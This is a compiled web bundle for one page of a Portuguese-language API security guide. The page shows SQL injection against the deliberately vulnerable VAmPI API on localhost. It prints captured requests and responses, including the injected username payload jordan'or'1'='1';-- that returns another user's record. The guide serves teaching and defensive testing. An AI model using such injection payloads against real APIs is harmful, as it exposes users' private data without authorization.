"use strict";(self.webpackChunkapi_security_basic_guide=self.webpackChunkapi_security_basic_guide||[]).push([[1471],{3905:(e,n,r)=>{r.d(n,{Zo:()=>p,kt:()=>m});var t=r(7294);function a(e,n,r){return n in e?Object.defineProperty(e,n,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[n]=r,e}function o(e,n){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),r.push.apply(r,t)}return r}function i(e){for(var n=1;n<arguments.length;n++){var r=null!=arguments[n]?arguments[n]:{};n%2?o(Object(r),!0).forEach((function(n){a(e,n,r[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(r,n))}))}return e}function s(e,n){if(null==e)return{};var r,t,a=function(e,n){if(null==e)return{};var r,t,a={},o=Object.keys(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||(a[r]=e[r]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var l=t.createContext({}),c=function(e){var n=t.useContext(l),r=n;return e&&(r="function"==typeof e?e(n):i(i({},n),e)),r},p=function(e){var n=c(e.components);return t.createElement(l.Provider,{value:n},e.children)},u={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},d=t.forwardRef((function(e,n){var r=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),d=c(r),m=a,b=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return r?t.createElement(b,i(i({ref:n},p),{},{components:r})):t.createElement(b,i({ref:n},p))}));function m(e,n){var r=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=r.length,i=new Array(o);i[0]=d;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s.mdxType="string"==typeof e?e:a,i[1]=s;for(var c=2;c<o;c++)i[c]=r[c];return t.createElement.apply(null,i)}return t.createElement.apply(null,r)}d.displayName="MDXCreateElement"},9634:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var t=r(7462),a=(r(7294),r(3905));const o={sidebar_position:2},i="Explora\xe7\xe3o",s={unversionedId:"Vulnerabilidades/SQL_Injection/exploracao",id:"Vulnerabilidades/SQL_Injection/exploracao",title:"Explora\xe7\xe3o",description:"---",source:"@site/docs/Vulnerabilidades/1_SQL_Injection/exploracao.md",sourceDirName:"Vulnerabilidades/1_SQL_Injection",slug:"/Vulnerabilidades/SQL_Injection/exploracao",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/SQL_Injection/exploracao",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"defaultSidebar",previous:{title:"Descri\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/SQL_Injection/descricao"},next:{title:"Corre\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/SQL_Injection/correcao"}},l={},c=[{value:"Vulnerabilidade na rota <code>/users/v1/{username}</code>",id:"vulnerabilidade-na-rota-usersv1username",level:2},{value:"Mais refer\xeancias dispon\xedveis na OWASP.",id:"mais-refer\xeancias-dispon\xedveis-na-owasp",level:4}],p={toc:c};function u(e){let{components:n,...r}=e;return(0,a.kt)("wrapper",(0,t.Z)({},p,r,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"explora\xe7\xe3o"},"Explora\xe7\xe3o"),(0,a.kt)("hr",null),(0,a.kt)("p",null,"Existem alguns m\xe9todos usados para identificar uma falha de SQL Injection, seja por meio de uma revis\xe3o do c\xf3digo fonte (em casos de testes white box), por meio da inje\xe7\xe3o maliciosa de string em inputs de dados de uma API, ferramentas de scan de vulnerabilidades etc."),(0,a.kt)("h2",{id:"vulnerabilidade-na-rota-usersv1username"},"Vulnerabilidade na rota ",(0,a.kt)("inlineCode",{parentName:"h2"},"/users/v1/{username}")),(0,a.kt)("p",null,"Inicialmente, foi usado o PostMan para enviar uma requisi\xe7\xe3o do tipo ",(0,a.kt)("inlineCode",{parentName:"p"},"GET")," com o username ",(0,a.kt)("strong",{parentName:"p"},"jordan")," como par\xe2metro e, posteriormente, analisar com o Burp Suite:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js",metastring:'title="GET /users/v1/{username}"',title:'"GET','/users/v1/{username}"':!0},"GET /users/v1/jordan HTTP/1.1\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: a6523c6b-4739-4b55-b9ed-9347a58845b8\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\n")),(0,a.kt)("p",null,"A resposta recebida foi:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js",metastring:'title="Response"',title:'"Response"'},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 56\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Fri, 30 Sep 2022 17:26:17 GMT\n\n{\n    "username": "jordan", \n    "email": "jjga.snf19@uea.edu.br"\n}\n')),(0,a.kt)("p",null,"Ao ter ci\xeancia do response leg\xedtimo enviado pela API para o usu\xe1rio ",(0,a.kt)("strong",{parentName:"p"},"jordan")," na respectiva rota, \xe9 poss\xedvel testar a sua fragilidade para o SQL Injection manipulando a requisi\xe7\xe3o com um par\xe2metro malicioo."),(0,a.kt)("p",null,"No Burp Suite, enviaremos novamente a requisi\xe7\xe3o alterando o par\xe2metro da requisi\xe7\xe3o para ",(0,a.kt)("inlineCode",{parentName:"p"},"jordan'or'1'='1';--")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js",metastring:"title=\"GET /users/v1/jordan'or'1'='1';--\"",title:'"GET',"/users/v1/jordan'or'1'":"'1';--\""},"GET /users/v1/jordan'or'1'='1';-- HTTP/1.1\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: a6523c6b-4739-4b55-b9ed-9347a58845b8\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\n")),(0,a.kt)("p",null,"Ent\xe3o, obtivemos a seguinte resposta do VAmPI:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js",metastring:'title="SQL Injection Response"',title:'"SQL',Injection:!0,'Response"':!0},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 48\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Fri, 30 Sep 2022 18:33:14 GMT\n\n{\n    "username": "name1",\n    "email": "mail1@mail.com"\n}\n')),(0,a.kt)("p",null,"Ao compararmos o body de ambas as responses, podemos notar que o endpoint usado para retornar as informa\xe7\xf5es de um usu\xe1rio \xe9 suscet\xedvel ao SQL Injection."),(0,a.kt)("h4",{id:"mais-refer\xeancias-dispon\xedveis-na-owasp"},"Mais refer\xeancias dispon\xedveis na ",(0,a.kt)("a",{parentName:"h4",href:"https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa8-injection.md"},"OWASP"),"."))}u.isMDXComponent=!0}}]);